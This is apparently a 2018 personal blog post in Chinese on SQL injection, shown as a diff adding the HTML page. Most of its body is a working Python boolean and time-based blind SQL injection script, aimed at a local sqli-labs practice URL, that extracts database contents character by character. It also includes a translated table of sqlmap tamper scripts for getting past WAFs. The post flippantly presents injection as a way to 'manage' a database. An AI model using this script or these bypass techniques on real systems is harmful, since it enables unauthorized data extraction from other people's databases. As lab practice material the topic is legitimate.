@@ -1,0 +1,713 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.qwerdf.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="SQL注入,问题经常来源于sql语句字符串拼接的时候未作过滤,其中世界上最好的语言之一——PHP——出现的问题最多. SQl注入通常用于在线管理自己的数据库👌,臃肿的PhpMyAdmin,需要下载的数据库连接软件.哪里有直接抄起键盘在地址栏直接输入就能管理来的快乐 我选择IE6有比在IE里面上网冲浪更快乐的事情么?">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql injection">
+<meta property="og:url" content="https://blog.qwerdf.com/2018/04/06/sql/index.html">
+<meta property="og:site_name" content="zzzZZZ">
+<meta property="og:description" content="SQL注入,问题经常来源于sql语句字符串拼接的时候未作过滤,其中世界上最好的语言之一——PHP——出现的问题最多. SQl注入通常用于在线管理自己的数据库👌,臃肿的PhpMyAdmin,需要下载的数据库连接软件.哪里有直接抄起键盘在地址栏直接输入就能管理来的快乐 我选择IE6有比在IE里面上网冲浪更快乐的事情么?">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2018-04-06T12:19:18.000Z">
+<meta property="article:modified_time" content="2023-07-12T18:12:00.701Z">
+<meta property="article:author" content="xz">
+<meta property="article:tag" content="security">
+<meta property="article:tag" content="sql">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.qwerdf.com/2018/04/06/sql/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>sql injection | zzzZZZ</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-88654486-1"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-88654486-1');
+      }
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">zzzZZZ</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blog.qwerdf.com/2018/04/06/sql/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/main.jpg">
+      <meta itemprop="name" content="xz">
+      <meta itemprop="description" content="Some Place where I can write something<br>总有一天你们会求我更博客的">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zzzZZZ">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sql injection
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2018-04-06 20:19:18" itemprop="dateCreated datePublished" datetime="2018-04-06T20:19:18+08:00">2018-04-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-07-13 02:12:00" itemprop="dateModified" datetime="2023-07-13T02:12:00+08:00">2023-07-13</time>
+              </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2018/04/06/sql/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/04/06/sql/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>SQL注入,问题经常来源于sql语句字符串拼接的时候未作过滤,其中世界上最好的语言之一——PHP——出现的问题最多.</p>
+<p>SQl注入通常用于在线管理自己的数据库👌,臃肿的PhpMyAdmin,需要下载的数据库连接软件.哪里有直接抄起键盘在地址栏直接输入就能管理来的快乐</p>
+<h1 id="我选择IE6"><a href="#我选择IE6" class="headerlink" title="我选择IE6"></a>我选择IE6</h1><p>有比在IE里面上网冲浪更快乐的事情么?</p>
+<span id="more"></span>
+
+<h1 id="我选择自写脚本"><a href="#我选择自写脚本" class="headerlink" title="我选择自写脚本"></a>我选择自写脚本</h1><p>自写脚本更能针对化的对应环境,对于白盒测试<del>或者批量</del>值得使用.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> fake_useragent</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Example</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.get_table = <span class="string">&quot;&quot;&quot;select group_concat(distinct table_name) from &quot;&quot;&quot;</span> + \</span><br><span class="line">                         <span class="string">&quot;&quot;&quot;information_schema.columns where table_schema=database()&quot;&quot;&quot;</span></span><br><span class="line">        self.get_database = <span class="string">&quot;&quot;&quot;select database()&quot;&quot;&quot;</span></span><br><span class="line">        self.get_version = <span class="string">&quot;&quot;&quot;select @@version&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_success_by_boolen</span>(<span class="params">get_url</span>):</span><br><span class="line">    ua = fake_useragent.UserAgent()</span><br><span class="line">    header = &#123;<span class="string">&quot;User-Agent&quot;</span>: ua.random&#125;</span><br><span class="line">    r = requests.get(get_url, headers=header)</span><br><span class="line">    success = <span class="string">&quot;Your Login name&quot;</span></span><br><span class="line">    <span class="keyword">if</span> success <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_success_by_time</span>(<span class="params">get_url</span>):</span><br><span class="line">    ua = fake_useragent.UserAgent()</span><br><span class="line">    header = &#123;<span class="string">&quot;User-Agent&quot;</span>: ua.random&#125;</span><br><span class="line">    before_time = time.time()</span><br><span class="line">    r = requests.get(get_url, headers=header)</span><br><span class="line">    after_time = time.time()</span><br><span class="line">    offset = after_time - before_time</span><br><span class="line">    success = <span class="number">8</span></span><br><span class="line">    <span class="keyword">if</span> success &lt; offset:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sql_fun</span>(<span class="params">sql_fun</span>):</span><br><span class="line">    url = <span class="string">r&quot;&quot;&quot;http://localhost/sqlilabs/practice/example1.php?id=1&#x27; and (&#123;0&#125;) --+&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># Timing-based Blind SQL Attacks</span></span><br><span class="line">    <span class="comment"># url = r&quot;&quot;&quot;http://localhost/sqlilabs/practice/example1.php?id=1&#x27; and if((&#123;0&#125;),sleep(10),0) --+&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    _long = -<span class="number">1</span></span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">9999</span>, <span class="number">1</span>):</span><br><span class="line">        sql = <span class="string">&quot;&quot;&quot;LENGTH((&#123;0&#125;))=&#123;1&#125;&quot;&quot;&quot;</span>.<span class="built_in">format</span>(sql_fun, i)</span><br><span class="line">        <span class="keyword">if</span> is_success_by_boolen(url.<span class="built_in">format</span>(sql)):</span><br><span class="line">            _long = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, _long, <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> string.printable:<span class="comment">#<span class="doctag">TODO:</span> 二分法优化</span></span><br><span class="line">            sql = <span class="string">&quot;&quot;&quot;(substr((&#123;0&#125;),&#123;1&#125;,1))=(&quot;&#123;2&#125;&quot;)&quot;&quot;&quot;</span>.<span class="built_in">format</span>(sql_fun, i, j)</span><br><span class="line">            <span class="keyword">if</span> is_success_by_boolen(url.<span class="built_in">format</span>(sql)):</span><br><span class="line">                out += <span class="string">&#x27;&#x27;</span> + j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;&#123;0&#125;:  &#123;1&#125;&quot;</span>.<span class="built_in">format</span>(Example().get_version, sql_fun(Example().get_version))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="我选择sqlmap"><a href="#我选择sqlmap" class="headerlink" title="我选择sqlmap"></a>我选择sqlmap</h1><p>sqlmap内置有万能的脚本,对于黑盒测试值得使用.</p>
+<table>
+<thead>
+<tr>
+<th>脚本</th>
+<th>直译</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>apostrophemask</td>
+<td>单引号伪装</td>
+<td>使用<em>UTF-8</em></td>
+</tr>
+<tr>
+<td>apostrophenullencode</td>
+<td>单引号null编码</td>
+<td>用双字节的unicode字符</td>
+</tr>
+<tr>
+<td>appendnullbyte</td>
+<td>尾部添加null字节</td>
+<td></td>
+</tr>
+<tr>
+<td>base64encode</td>
+<td>base64编码</td>
+<td></td>
+</tr>
+<tr>
+<td>between</td>
+<td>即<em>between</em></td>
+<td>替换 <em>&lt;* *&#x3D;* *&gt;</em></td>
+</tr>
+<tr>
+<td>bluecoat</td>
+<td>bypass Blue Coat Systems</td>
+<td>老外的公司</td>
+</tr>
+<tr>
+<td>chardoubleencode</td>
+<td>字符两次编码</td>
+<td>即两次url编码</td>
+</tr>
+<tr>
+<td>charencode</td>
+<td>…</td>
+<td></td>
+</tr>
+<tr>
+<td>charunicodeencode</td>
+<td>字符unicode编码</td>
+<td>即 <em>%uxxxx</em> 编码</td>
+</tr>
+<tr>
+<td>charunicodeescape</td>
+<td>字符unicode转义</td>
+<td>即 <em>\uxxxx</em> 编码</td>
+</tr>
+<tr>
+<td>commalessmid</td>
+<td>mid更少的逗号</td>
+<td>MID(A,B,C) –&gt; MID(A FROM B FOR C)</td>
+</tr>
+<tr>
+<td>commalesslimit</td>
+<td>limit更少的逗号</td>
+<td>LIMIT M, N –&gt; LIMIT N OFFSET M</td>
+</tr>
+<tr>
+<td>commentbeforeparentheses</td>
+<td>括号之前注释</td>
+<td></td>
+</tr>
+<tr>
+<td>concat2concatws</td>
+<td>concat –&gt; concat_ws</td>
+<td></td>
+</tr>
+<tr>
+<td>equaltolike</td>
+<td><em>&#x3D;</em> –&gt; <em>like</em></td>
+<td></td>
+</tr>
+<tr>
+<td>escapequotes</td>
+<td>转义引号</td>
+<td>引号前面加 <strong>\\</strong>  (意义?)</td>
+</tr>
+<tr>
+<td>greatest</td>
+<td>GREATEST()</td>
+<td>返回参数的最大值,用于替换<em>and</em>后的 <em>&gt;</em></td>
+</tr>
+<tr>
+<td>halfversionedmorekeywords</td>
+<td><em>更多的关键字在一半的版本上</em>(?)</td>
+<td>即加注释,如 <em>&#x2F;*!0UNION</em><br/>(MySQL &lt; 5.1)</td>
+</tr>
+<tr>
+<td>htmlencode</td>
+<td>html编码</td>
+<td>即 <em>&amp;#xx;</em> 编码</td>
+</tr>
+<tr>
+<td>ifnull2casewhenisnull</td>
+<td>IFNULL() –&gt;CASE WHEN ISNULL()</td>
+<td>没见过的操作</td>
+</tr>
+<tr>
+<td>ifnull2ifisnull</td>
+<td>IFNULL()–&gt;IF ISNULL()</td>
+<td>…</td>
+</tr>
+<tr>
+<td>informationschemacomment</td>
+<td>information_schema注释</td>
+<td>information_schema&#x2F;**&#x2F;.table</td>
+</tr>
+<tr>
+<td>least</td>
+<td>LEAST()</td>
+<td>返回参数的最小值,用于替换<em>and</em>后的 <em>&gt;</em></td>
+</tr>
+<tr>
+<td>lowercase</td>
+<td>小写</td>
+<td></td>
+</tr>
+<tr>
+<td>modsecurityversioned</td>
+<td><em>ModSecurity版本</em>(?)</td>
+<td>开源的WAF</td>
+</tr>
+<tr>
+<td>modsecurityzeroversioned</td>
+<td><em>ModSecurity零版本</em>(?)</td>
+<td>..</td>
+</tr>
+<tr>
+<td>multiplespaces</td>
+<td>多个空格</td>
+<td>就是瞎鸡儿加空格</td>
+</tr>
+<tr>
+<td>nonrecursivereplacement</td>
+<td>非递归替换</td>
+<td>union –&gt; uni<strong>union</strong>on</td>
+</tr>
+<tr>
+<td>overlongutf8</td>
+<td>超长的UTF-8</td>
+<td>即 <em>%xx%xx</em> 编码(不转换字母)</td>
+</tr>
+<tr>
+<td>overlongutf8more</td>
+<td>更长的UTF-8</td>
+<td>即 <em>%xx%xx</em> 编码…(转换字母)</td>
+</tr>
+<tr>
+<td>percentage</td>
+<td>百分号</td>
+<td>select –&gt; S%E%L%E%C%T</td>
+</tr>
+<tr>
+<td>plus2concat</td>
+<td>+ –&gt; CONCAT()</td>
+<td>适用于(char(x)+char(x))</td>
+</tr>
+<tr>
+<td>plus2fnconcat</td>
+<td>+ –&gt; {fn CONCAT()}</td>
+<td>ODBC only</td>
+</tr>
+<tr>
+<td>randomcase</td>
+<td>随机大小写</td>
+<td></td>
+</tr>
+<tr>
+<td>randomcomments</td>
+<td>随机注释</td>
+<td><strong>&#x2F;**&#x2F;</strong></td>
+</tr>
+<tr>
+<td>securesphere</td>
+<td>SecureSphere</td>
+<td>WAF</td>
+</tr>
+<tr>
+<td>sp_password</td>
+<td>sp_password</td>
+<td>日志</td>
+</tr>
+<tr>
+<td>space2*</td>
+<td>spacee -&gt; *</td>
+<td></td>
+</tr>
+<tr>
+<td>symboliclogical</td>
+<td>逻辑符号</td>
+<td>AND&#x2F;OR -&gt; &amp;&amp;&#x2F;&amp;Iota;&amp;Iota;</td>
+</tr>
+<tr>
+<td>unionalltounion</td>
+<td>union all -&gt; union</td>
+<td></td>
+</tr>
+<tr>
+<td>unmagicquotes</td>
+<td>魔术引号</td>
+<td>即%bf%27,神奇的<strong>縗’</strong></td>
+</tr>
+<tr>
+<td>uppercase</td>
+<td>大写</td>
+<td></td>
+</tr>
+<tr>
+<td>varnish</td>
+<td>Varnish</td>
+<td>WAF</td>
+</tr>
+<tr>
+<td>versionedkeywords</td>
+<td><em>版本的关键字</em>(?)</td>
+<td>即&#x2F;!*select&#x2F;,不包括函数</td>
+</tr>
+<tr>
+<td>versionedmorekeywords</td>
+<td><em>更多的版本的关键字</em>(?)</td>
+<td>即&#x2F;!*select&#x2F;,包括函数</td>
+</tr>
+<tr>
+<td>xforwardedfor</td>
+<td>X-Forwarded-For</td>
+<td></td>
+</tr>
+</tbody></table>
+<h1 id="我选择”啊D”"><a href="#我选择”啊D”" class="headerlink" title="我选择”啊D”"></a>我选择”啊D”</h1><p>是…是大佬呢…</p>
+<!--小弟我对大佬你的景仰犹如滔滔江水连绵不绝又如黄河泛滥一发不可收拾天地可证日月可鉴。-->
+
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a><p style="font-size:16px">参考链接:</p></h1><p><a target="_blank" rel="noopener" href="https://mariadb.com/kb/en/library/string-functions/">Sql中操纵字符串的函数方法</a></p>
+<p><a target="_blank" rel="noopener" href="https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423">SQLMap Tamper Scripts (SQL Injection and WAF bypass)</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/security/" rel="tag"># security</a>
+              <a href="/tags/sql/" rel="tag"># sql</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/03/31/unable-login-SSH-with-key/" rel="prev" title="记一次诡异的ssh密钥登录失败">
+      <i class="fa fa-chevron-left"></i> 记一次诡异的ssh密钥登录失败
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2018/04/11/Modify-memory/" rel="next" title="查找并修改游戏的内存数据">
+      查找并修改游戏的内存数据 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%88%91%E9%80%89%E6%8B%A9IE6"><span class="nav-number">1.</span> <span class="nav-text">我选择IE6</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%88%91%E9%80%89%E6%8B%A9%E8%87%AA%E5%86%99%E8%84%9A%E6%9C%AC"><span class="nav-number">2.</span> <span class="nav-text">我选择自写脚本</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%88%91%E9%80%89%E6%8B%A9sqlmap"><span class="nav-number">3.</span> <span class="nav-text">我选择sqlmap</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%88%91%E9%80%89%E6%8B%A9%E2%80%9D%E5%95%8AD%E2%80%9D"><span class="nav-number">4.</span> <span class="nav-text">我选择”啊D”</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">5.</span> <span class="nav-text">参考链接:</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="xz"
+      src="/uploads/main.jpg">
+  <p class="site-author-name" itemprop="name">xz</p>
+  <div class="site-description" itemprop="description">Some Place where I can write something<br>总有一天你们会求我更博客的</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">43</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">39</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xz</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+  function loadCount() {
+    var d = document, s = d.createElement('script');
+    s.src = 'https://tencentadmin.disqus.com/count.js';
+    s.id = 'dsq-count-scr';
+    (d.head || d.body).appendChild(s);
+  }
+  // defer loading until the whole page loading is completed
+  window.addEventListener('load', loadCount, false);
+</script>
+<script>
+  var disqus_config = function() {
+    this.page.url = "https://blog.qwerdf.com/2018/04/06/sql/";
+    this.page.identifier = "2018/04/06/sql/";
+    this.page.title = "sql injection";
+    };
+  NexT.utils.loadComments(document.querySelector('#disqus_thread'), () => {
+    if (window.DISQUS) {
+      DISQUS.reset({
+        reload: true,
+        config: disqus_config
+      });
+    } else {
+      var d = document, s = d.createElement('script');
+      s.src = 'https://tencentadmin.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', '' + +new Date());
+      (d.head || d.body).appendChild(s);
+    }
+  });
+</script>
+
+</body>
+</html>
